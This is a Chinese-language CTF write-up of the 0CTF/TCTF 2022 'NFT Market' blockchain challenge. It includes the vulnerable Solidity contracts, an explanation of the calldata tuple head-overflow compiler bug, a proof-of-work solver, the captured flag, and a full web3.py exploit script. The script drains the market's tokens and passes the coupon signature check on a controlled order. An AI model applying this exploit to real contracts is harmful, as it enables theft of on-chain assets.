---
title: Blockchain - TCTF NFT Market
description: 2022 | 0CTF/TCTF | Misc
tags:
    - smart contract
    - head overflow
---

## 题目

Welcome to TCTF NFT Market, a secure, open-source, and decentralized NFT marketplace!

Trade your favourite NFTs (and flag) here!

> nc 47.102.40.39 20000

## 解题思路

??? note "PoW.py"

    ```py
    import itertools, pwn
    from hashlib import sha256
    from string import ascii_letters, digits

    table = ascii_letters + digits

    conn = pwn.remote('47.102.40.39', 20000)
    ret = conn.recvline_contains('sha256').decode()
    base = ret[ret.find('(') + 1: ret.find('+ ???')].strip()

    for ch in itertools.permutations(table, 4):
        m = base + ''.join(ch)
        if sha256(m.encode()).hexdigest().endswith('00000'):
            conn.sendafter('[-] ??? =', f'{m[-4:]}\n')
            break
    conn.interactive()
    ```

- 持有 tokenId 为 1、2、3 的 TNFT 即可触发事件 `SendFlag`
    - 可以调用一次 `airdrop()` 获得 5 TTK
    - 当持有或被批准使用 TNFT 时，可以 `createOrder()` 或 `cancelOrder()`
    - 当持有足够 TTK 时可以 `purchaseOrder()`
    - 可以使用经 TNFT 所有者签名的 coupon 调用一次 `purchaseWithCoupon()`，以修改后的价格进行购买
    - 可以进行一次 `purchaseTest()`，`TctfMarket` 将自己完成订单的创建与购买，由于 `approve` 不能授权给所有者，可以利用 `purchaseTest()` 来转移 `TctfMarket` 的 TTK

    ??? note "task.sol"

        ```js
        // SPDX-License-Identifier: UNLICENSED
        pragma solidity 0.8.15;

        import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
        import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
        import "@openzeppelin/contracts/access/Ownable.sol";


        contract TctfNFT is ERC721, Ownable {
            constructor() ERC721("TctfNFT", "TNFT") {
                _setApprovalForAll(address(this), msg.sender, true);
            }

            function mint(address to, uint256 tokenId) external onlyOwner {
                _mint(to, tokenId);
            }
        }

        contract TctfToken is ERC20 {
            bool airdropped;

            constructor() ERC20("TctfToken", "TTK") {
                _mint(address(this), 100000000000);
                _mint(msg.sender, 1337);
            }

            function airdrop() external {
                require(!airdropped, "Already airdropped");
                airdropped = true;
                _mint(msg.sender, 5);
            }
        }

        struct Order {
            address nftAddress;
            uint256 tokenId;
            uint256 price;
        }
        struct Coupon {
            uint256 orderId;
            uint256 newprice;
            address issuer;
            address user;
            bytes reason;
        }
        struct Signature {
            uint8 v;
            bytes32[2] rs;
        }
        struct SignedCoupon {
            Coupon coupon;
            Signature signature;
        }

        contract TctfMarket {
            event SendFlag();
            event NFTListed(
                address indexed seller,
                address indexed nftAddress,
                uint256 indexed tokenId,
                uint256 price
            );

            event NFTCanceled(
                address indexed seller,
                address indexed nftAddress,
                uint256 indexed tokenId
            );

            event NFTBought(
                address indexed buyer,
                address indexed nftAddress,
                uint256 indexed tokenId,
                uint256 price
            );

            bool tested;
            TctfNFT public tctfNFT;
            TctfToken public tctfToken;
            CouponVerifierBeta public verifier;
            Order[] orders;

            constructor() {
                tctfToken = new TctfToken();
                tctfToken.approve(address(this), type(uint256).max);

                tctfNFT = new TctfNFT();
                tctfNFT.mint(address(tctfNFT), 1);
                tctfNFT.mint(address(this), 2);
                tctfNFT.mint(address(this), 3);

                verifier = new CouponVerifierBeta();

                orders.push(Order(address(tctfNFT), 1, 1));
                orders.push(Order(address(tctfNFT), 2, 1337));
                orders.push(Order(address(tctfNFT), 3, 13333333337));
            }

            function getOrder(uint256 orderId) public view returns (Order memory order) {
                require(orderId < orders.length, "Invalid orderId");
                order = orders[orderId];        
            }

            function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
                require(price > 0, "Invalid price");
                require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
                orders.push(Order(nftAddress, tokenId, price));
                emit NFTListed(msg.sender, nftAddress, tokenId, price);
                return orders.length - 1;
            }

            function cancelOrder(uint256 orderId) external {
                Order memory order = getOrder(orderId);
                require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");
                _deleteOrder(orderId);
                emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);
            }

            function purchaseOrder(uint256 orderId) external {
                Order memory order = getOrder(orderId);
                _deleteOrder(orderId);
                IERC721 nft = IERC721(order.nftAddress);
                address owner = nft.ownerOf(order.tokenId);
                tctfToken.transferFrom(msg.sender, owner, order.price);
                nft.safeTransferFrom(owner, msg.sender, order.tokenId);
                emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);
            }

            function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
                Coupon memory coupon = scoupon.coupon;
                require(coupon.user == msg.sender, "Invalid user");
                require(coupon.newprice > 0, "Invalid price");
                verifier.verifyCoupon(scoupon);
                Order memory order = getOrder(coupon.orderId);
                _deleteOrder(coupon.orderId);
                IERC721 nft = IERC721(order.nftAddress);
                address owner = nft.ownerOf(order.tokenId);
                tctfToken.transferFrom(coupon.user, owner, coupon.newprice);
                nft.safeTransferFrom(owner, coupon.user, order.tokenId);
                emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
            }

            function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
                require(!tested, "Tested");
                tested = true;
                IERC721 nft = IERC721(nftAddress);
                uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);
                nft.approve(address(this), tokenId);
                TctfMarket(this).purchaseOrder(orderId);
            }

            function win() external {
                require(tctfNFT.ownerOf(1) == msg.sender && tctfNFT.ownerOf(2) == msg.sender && tctfNFT.ownerOf(3) == msg.sender);
                emit SendFlag();
            }

            function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {
                IERC721 nft = IERC721(nftAddress);
                address owner = nft.ownerOf(tokenId);
                return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
            }

            function _deleteOrder(uint256 orderId) internal {
                orders[orderId] = orders[orders.length - 1];
                orders.pop();
            }

            function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
                return this.onERC721Received.selector;
            }
        }

        contract CouponVerifierBeta {
            TctfMarket market;
            bool tested;

            constructor() {
                market = TctfMarket(msg.sender);
            }

            function verifyCoupon(SignedCoupon calldata scoupon) public {
                require(!tested, "Tested");
                tested = true;
                Coupon memory coupon = scoupon.coupon;
                Signature memory sig = scoupon.signature;
                Order memory order = market.getOrder(coupon.orderId);
                bytes memory serialized = abi.encode(
                    "I, the issuer", coupon.issuer,
                    "offer a special discount for", coupon.user,
                    "to buy", order, "at", coupon.newprice,
                    "because", coupon.reason
                );
                IERC721 nft = IERC721(order.nftAddress);
                address owner = nft.ownerOf(order.tokenId);
                require(coupon.issuer == owner, "Invalid issuer");
                require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
            }
        }
        ```

- 通过 `airdrop()` 和 `purchaseTest()` 容易获得 tokenId 为 1、2 的 TNFT。要获得 tokenId 为 3 的 TNFT 显然需要使用到 `purchaseWithCoupon()`，但所有者为合约，不存在能够用于签名的私钥，`verifyCoupon()` 的判断条件也相当严格，无法伪造签名
    - 虽然有想过通过 `purchaseWithCoupon()` 来窃取合约 `TctfToken` 的 TTK，但 `purchaseWithCoupon()` 限制了 `msg.sender` 必须为 `coupon.user` (╥ω╥)
- 在 0.8.16 之前存在 Head Overflow 的 Bug，发生在 calldata tuple 进行 ABI 重编码时，`SignedCoupon` 恰好满足漏洞触发的条件
    - tuple 的最后一个元素是静态数组且存储在 **calldata**，数组元素为基本类型 `uint` 或 `bytes32`，对应 `Signature` 中的 `bytes32[2] rs`
    - tuple 包含至少一个动态元素，如 `bytes` 或包含动态数组的结构体，即 `Coupon` 中的 `bytes reason`
    - 代码使用 ABI coder v2（自 0.8.0 起默认）
- tuple 的 ABI 编码包含两部分，静态编码的 *head* 以及动态编码的 *tail*，*head* 中包含静态元素以及动态元素自编码起的偏移，动态元素实际存储在 *tail* 中
- 编码后的 `scoupon` 参数布局如下，底部数字表示编码的顺序

    ```
    +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+
    |                     HEAD                    | |                                                     TAIL                                                    |
    +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+
    |               value of scoupon              | |                                               value of coupon                                               |
    |                 SignedCoupon                | |                                                    Coupon                                                   |
    |                                             | |                                                                                                             |
    |                                             | |                                                                                                             |
    +------------------+--------------------------+ +-------------------------------------------------------------------------------------------+-----------------+
    | offset of coupon |    value of signature    | |                                       HEAD of Coupon                                      |  TAIL of Coupon |
    |                  |         Signature        | |                                                                                           |                 |
    |       uint       +------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+
    |                  | value of v | value of rs | | value of orderId | value of newprice | value of issuer | value of user | offset of reason | value of reason |
    |                  |    int8    |  bytes32[2] | |      uint256     |      uint256      |     address     |    address    |       uint       |      bytes      |
    +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+
    |         1        |      8     |      9      | |         2        |         3         |        4        |       5       |         6        |        7        |
    +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+
    ```

- 当静态数组作为结构体最后一个元素时，其后 *tail* 的前 $32$ 字节将被覆盖（实际将被覆盖为 $0$）。也就是说，当 `purchaseWithCoupon()` 调用 `verifyCoupon()` 时，实际参与验证的都是 `orderId` 为 `0` 的订单
- 首先再创建一个 `TctfNFT` 合约并 `mint()` 1 个 token，利用 `purchaseTest()` 转移 `TctfMarket` 的所有余额。随后 `purchaseOrder(1)`，此时 `tokenId` 为 `3` 的订单下标为 `1`，接着 `createOrder()` 使得调用 `purchaseOrder(0)` 后 `orderId` 为 `0` 的订单受控，从而能对其进行签名并通过验证

    ```py
    from web3 import Web3
    import json, eth_abi, requests

    def transact(func, gas=1000000):
        # 完善 transaction 相关参数避免 401 Client Error: Unauthorized for url
        # 参考：https://github.com/chainflag/eth-challenge-base/issues/19
        tx = account.sign_transaction(eval(func).buildTransaction({
            'chainId': w3.eth.chain_id,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': gas,
            'gasPrice': w3.eth.gas_price,
        })).rawTransaction
        tx_hash = w3.eth.send_raw_transaction(tx).hex()
        return w3.eth.wait_for_transaction_receipt(tx_hash)

    w3 = Web3(Web3.HTTPProvider("http://47.102.40.39:8545"))
    account = w3.eth.account.create()
    print(account.address, account.privateKey.hex())
    tx_hash = requests.post('http://47.102.40.39:8080/api/claim', data={'address': account.address}).text.split(' ')[1]
    if tx_hash.startswith('0x'):
        w3.eth.wait_for_transaction_receipt(tx_hash)

    market_addr = '0x6FcDb85597567cACe6DCacE3cd58Da6fea815cB6'

    market_abi = json.loads(open('NFTmarket/market_abi.json').read())
    token_abi = json.loads(open('NFTmarket/token_abi.json').read())
    nft_abi = json.loads(open('NFTmarket/nft_abi.json').read())

    market_contract = w3.eth.contract(address=market_addr, abi=market_abi)
    token_addr = market_contract.functions.tctfToken().call()
    token_contract = w3.eth.contract(address=token_addr, abi=token_abi)
    nft_addr = market_contract.functions.tctfNFT().call()
    nft_contract = w3.eth.contract(address=nft_addr, abi=nft_abi)

    nft_bytecode = open('NFTmarket/nft_bytecode.txt').read()
    fnft_contract = w3.eth.contract(abi=nft_abi, bytecode=nft_bytecode)
    # 汽油费不足会导致合约创建失败，仍然能获得合约地址，但无法与之交互
    fnft_addr = transact('fnft_contract.constructor()', fnft_contract.constructor().estimateGas() * 2).contractAddress
    print('fake NFT:', fnft_addr)
    fnft_contract = w3.eth.contract(address=fnft_addr, abi=nft_abi)

    transact('fnft_contract.functions.mint(account.address, 1)')
    transact('fnft_contract.functions.mint(account.address, 2)')
    transact('fnft_contract.functions.setApprovalForAll(market_addr, True)')
    transact('market_contract.functions.purchaseTest(fnft_addr, 1, 1337)')
    transact('token_contract.functions.airdrop()')
    print('Current TTK balance:', token_contract.functions.balanceOf(account.address).call())
    transact('token_contract.functions.approve(market_addr, 1339)')
    transact('market_contract.functions.purchaseOrder(1)')
    transact('market_contract.functions.createOrder(fnft_addr, 2, 1)')
    transact('market_contract.functions.purchaseOrder(0)')

    print(market_contract.functions.getOrder(0).call())
    print(market_contract.functions.getOrder(1).call())

    data = ["I, the issuer", account.address,
            "offer a special discount for", account.address,
            "to buy", [fnft_addr, 2, 1], "at", 1,
            "because", b'']
    serialized = eth_abi.encode(['string', 'address', 'string', 'address', 'string', '(address,uint256,uint256)', 'string', 'uint', 'string', 'bytes'], data)
    serialized = serialized[:-32]   # eth_abi==2.2.0，当 bytes 长度为 0 时仍填充了 32 字节 \x00，比通过 solidity 进行 abi.encode() 的结果多 32 字节

    sig = w3.eth.account._sign_hash(w3.solidityKeccak(['bytes'], [serialized]), private_key=account.privateKey)
    assert w3.eth.account._recover_hash(w3.solidityKeccak(['bytes'], [serialized]), signature=sig.signature.hex()) == account.address

    scoupon = ({
        'coupon': (1, 1, account.address, account.address, b''),    # 购买 tokenId 为 3 的 TNFT
        'signature': (sig.v, [w3.toHex(sig.r), w3.toHex(sig.s)])
    })
    transact('market_contract.functions.purchaseWithCoupon(scoupon)')

    print('TNFT count:', nft_contract.functions.balanceOf(account.address).call())
    print(transact('market_contract.functions.win()').transactionHash.hex())
    ```

### Flag

> flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}

## 参考资料

- [Head Overflow Bug in Calldata Tuple ABI-Reencoding | Solidity Blog](https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/)
- [Formal Specification of the Encoding](https://docs.soliditylang.org/en/latest/abi-spec.html#formal-specification-of-the-encoding)